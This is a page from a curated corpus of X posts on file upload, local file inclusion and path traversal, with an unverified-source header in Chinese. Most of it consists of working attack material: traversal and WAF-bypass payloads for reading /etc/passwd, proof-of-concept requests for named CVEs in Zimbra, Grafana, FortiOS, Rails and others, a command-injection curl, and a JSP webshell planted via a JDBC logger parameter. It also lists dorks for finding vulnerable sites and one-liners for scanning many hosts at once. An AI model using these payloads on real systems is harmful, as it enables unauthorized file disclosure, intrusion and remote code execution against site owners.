# X 语料 · 文件上传与路径穿越（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
同一载荷被多号转贴者只留一份（保留信息最全的版本）；被截断到只剩标题、载荷全丢的条目已剔除。
个别条目原始抓取存在转义叠加（如反斜杠三连），已按语义还原。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[文件上传](../by-type/file-upload.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-file（14 条）、x-residual-upload（1 条）、x-residual-lfi_traversal（13 条） · 本文 202 行

- Found a website with login portal at site/pub/signin/signin.aspx
  Tried site/signup/signup.aspx and created an account
  Logged-in > file upload form > XXE.
- And sometimes for LFI:
  url?para=//..//..//..//..//..//..//..//..//etc//passwd//
- You found an LFI but can't disclose all source code due to a different Webroot path. Use /proc/self/cwd/ which points to the current directory.
  Exp: /?page=/proc/self/cwd/index.php
- Dork para encontrar paginas vulnerables a local file inclusion:
  inurl:../etc/passwd -intext:etc root:x
- P1 zimbra LFI:
  [http://victim.com]/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00
- Wildcard bypass & LFI
  1. Intercepted a POST req that pointed to a local file "/usr/local/redacted/filename"
  2. tried "/etc/passwd" -> bad request
  3. "/user/local/../../etc/passwd" -> bad request
  4. "/user/local/redacted/../../../etc/passwd" -> OK
  5. LFI
- Content Discovery list:
  /_session_start_/%0atest
  /+CSCOU+/../+CSCOE+/files/file_list.json
  /josso/%5C../web-console
  /gui/file_viewer.php?encrypt=N&target_folder=utilities&uploaded_filename=../../../../../../../etc/passwd
- Normal URL http://site.com/user.php?file=/data2020.pdf
  Normal LFI http://site.com/user.php?file=/etc/passwd / ../../../etc/passwd
  If you dont get the response, try this LFI bypass:
  http://site.com/user.php?file=/data2020.pdf/site.com/../../../etc/passwd
- alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{' "
- WAF bypass, case File Upload (.php blocked):
  /?file=xx.php <- Blocked
  /?file===xx.php <- Bypassed
  The file got uploaded successfully.
- LFI via Downloading Documents
  1) Found download button to download documents
  2) Captured request in burp & found document location was defined in "filepath" parameter
  3) Replace ?filepath=/etc/passwd
- Don't forget to add `layout` parameter to your wordlist. It got me a nice lfi on a private program.
- WeiPHP path Traversal
  POC:
  [*] POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
  [*] GET /public/index.php/home/file/user_pics
  [*] GET /png/gif
- SOME Local File Inclusion Parameters:-
   ?dir=/  ?conf=/  ?content=/  ?action=/  ?file=/
   ?path=/  ?page=/  ?locate=/  ?site=/  ?download=/
- An interesting directory traversal bypass:
  /../../etc/passwd — Got nothing?
  Try this: %252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
  Directory traversal with double URL encoding.
  https://github.com/thecybertix/One-Liner-Collections
- If you run brute force on url, always investigate these:
  /admin/  /admin/../admin  //admin/  /Admin/  /admin;/  /Admin;/
  /index.php/admin/  /admin/js/*.js  /admin/*brute*.ext  /admin../admin  //anything/admin/
- Unauth RCEs and an Arbitrary File Upload in HyperFlex HX Data Platform
  Payload: curl -v http://192.168.123.133/storfs-asup -d 'action=&token=`id`&mode=`id`'
  CVE-2021-1497 / CVE-2021-1498 / CVE-2021-1499
- Automate Directory Path Traversal:
  cat lfipatterns.txt | xargs -P 50 -I host bash -c "curl -s -L 'host' | grep \"root:\" && echo -e \"[VULNERABLE] - host \n \"" | grep "VULNERABLE"
- File Upload Tricks
  - Use double extensions: .php
  - Use reverse double extension
  - Mix uppercase and lowercase: .pHp, .pHP5, .PhAr
  - Null byte
  - Multiple dots: file.php......
  - Whitespace characters: file.php%20
- LFI WAF Bypass
  file:/etc/passwd?/
  file:/etc/passwd%3F/
  file:/etc%252Fpasswd/
  file:/etc%252Fpasswd%3F/
  file:///etc/?/../passwd
  file:///etc/%3F/../passwd
  file:${br}/et${u}c/pas${te}swd?/
  file:$(br)/et$(u)c/pas$(te)swd?/
- LFI Bypass:
  1) /usr/bin/cat /etc/passwd == /???/???/c?t$IFS/?t?/p?s?wd
  2) /*/?at$IFS/???/???swd
  3) /****/?at$IFS/???/*swd
  4) /****/?at$IFS/???/*******swd
  (IFS is Internal Field Separator = [space], [tab] or a [newline])
- CVE-2021-41277 Metabase Custom GeoJSON Map file inclusion
  https://domain/api/geojson?url=file:///etc/passwd
  httpx -l IPlist.txt -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
- LFI in SwaggerUI — add this payload for your LFI word list:
  /v1/docs//..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/etc/passwd HTTP/1.1
  NOTE: its not working from browser
- Grafana unauthorized arbitrary file read
  HOST/public/plugins/graph/grafana-clock-panel/../../../../../../etc/passwd
  try more plugins like "grafana-simple-json-datasource"
- Local File Inclusion WAF (Cloudflare) bypass
  ../../etc/passwd = 403 Forbidden
  ../../etc/random/../passwd = 200 OK
- Local File Inclusion to Access System Files (Windows):
  /../../c:/windows/system32/drivers/etc/hosts
- Nginx merge slashes path traversal vulnerability in one of the popular tech giants.
  Payload: GET ///////../../../etc/passwd
- Got a file upload restricted to `.json` files ANYWHERE on the system?
  Try to overwrite a dependency manager file, like package.json or composer.json.
  Most times they have a "scripts" property that runs a command before every action, like an update.
- LFI Trick:
  /fileRead.jsp?fileName=/etc/passwd (406)
  /fileRead.jsp?fileName=/?tc/?asswd (200)
  /fileRead.jsp?fileName=/??c/??sswd (200)
  source: https://sevenlayers.com/index.php/205-waf-bypass
- If a target is using ASP .NET and you see a param that is probably fetching a file from the server, and your generic LFI or path traversal payloads don't work, try to trigger a DNS ping back to your server using `\`.
- Ways to bypass JSON Web Token controls — KID manipulation:
  {
   "alg" : "HS256",
   "typ" : "JWT",
   "kid" : "1"
  }
  If the field is user-controlled it can lead to directory traversal:
  "kid": "../../etc/groups"
- Tip to increasing your endpoint search (directory traversal, xlinkfinder):
  echo http://domain.com | subfinder -silent | xargs -I@ sh -c 'python3 waymore.py -i @ -mode U'
- path traversal filter bypass payload list:
  ../../../etc/passwd
  /etc/passwd
  ...//....//....//etc/passwd
  %252f..%252f..%252fetc/passwd
  /var/www/images/../../../etc/passwd
- LFI P1
  1- Go to admin.site.tld/login
  2- Tried to login with wrong credentials > error
  3- Send to burp repeater
  4- Found new parameter `filename` because of error
  5- Tried payload ../../../../../../../../../../../../etc/passwd
  6- Full LFI
- After a good recon with fuzzing and port scanning, I started to look for path traversal and found an Nginx merge slashes path traversal at one of the endpoints on port 8080.
  Payload: GET /endpoint///////../../../../../../../etc/passwd
- DORK: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpassw
- CVE-2019-5418 LFI in Rails: this is a 3 year old bug and still exists. The page gives 404, but the buggy app is still in the server running.
  Add "Accept: ../../../../../../../../etc/passwd{{" to the GET request and read /etc/passwd.
- Some filter bypass payloads while hunting for LFI:
  index.php?page=....//....//etc/passwd
  index.php?page=..///////..////..//////etc/passwd
  index.php?page=/var/www/../../etc/passwd
- var/www/../../etc/passwd
  /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
- One-liner LFI:
  gau http://target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
  You can use your own encoded payloads.
- SSTI payload to read an arbitrary file on a flask server:
  {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
  Has a very high success rate — simple pythonic local file disclosure.
- One-liner to find NGINX path traversal:
  httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
- Google Dork - LFI Prone Parameters
  inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example[.]com
- Some servers strip directory traversal sequences before passing your input to the application. Try this payload with URL encoding: %2e%2e%2f
- LFI in a misconfigured rails application
  `accept: ../../../../../../../../etc/passwd{{`
  def index
    render file: "#{Rails.root}/some/file"
  end
  https://github.com/mpgn/CVE-2019-5418
- A path traversal vulnerability in the FortiOS SSL VPN web portal, CVE-2018-13379
  httpx -l ips.txt -path "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -status-code -mc 200
- Ghost Path Traversal CVE-2023-32235
  POC: "{{base-uri}}/assets/built%2F..%2F..%2F/package.json"
  One-liner: httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -mc 200
- CVE-2023-0126 Pre-authentication path traversal in SMA1000
  One Liner:
  cat file.txt | while read host; do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN"; done
- Bypassing WAF by adding multiple slashes to gain SSI / path traversal.
  Payload: GET /assets/css///////../../../../../../../../etc/passwd
- Google Dork - File Upload
  (site:example[.]com | site:example[.]org) & intext:"choose file"
- 1- Found login page
  2- Intercepted POST login request
  3- Found parameter called config=
  4- Payload ../../../../../../../../../etc/passwd
  5- Successfully read data
  (path traversal, not LFI)
- LFI exploitation tool
  1. Gather parameters from wayback
  waybackurls target | grep -Eo '\b[^=&?]+\=[^&?]+' | awk -F= '{print $1}' | sort -u
  2. Bruteforce LFI
  xargs -I{} httpx -silent -path "?{}=/../../../../../../../../etc/hosts" -u target
- LFI automation, detection + exploitation
  STEP1: waymore -i http://TARGET.COM -mode U --no-subs
  STEP2: cat ~/.config/waymore/results/target.com/waymore.txt | uro | sed 's/=.*/=/' | gf lfi | nuclei -tags lfi
- Local File inclusion over a proxy + url list:
  proxychains cat urlx.txt | uro | sed 's/=.*/=/' | gf lfi | nuclei -tags lfi
- Find LFI one-liner automation:
  waymore -i "http://testphp.vulnweb.com" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w ./lfi.txt -c -mr "root:" -v; done
- File upload - extension bypass
  <FILE>.php%20
  <FILE>.php%0a
  mv
- Whenever I do code review on a NodeJS app, I look for `fs.readFile()` — in many cases it's left without path validation, which makes it vulnerable to arbitrary file read.
- PostgreSQL arbitrary file write via JDBC logger:
  jdbc:postgresql://localhost:5432/test?user=test&password=test&loggerLevel=DEBUG&loggerFile=./blah.jsp&<%Runtime.getRuntime().exec(request.getParameter("i"));%>
  https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-673j-qm5f-xpv8
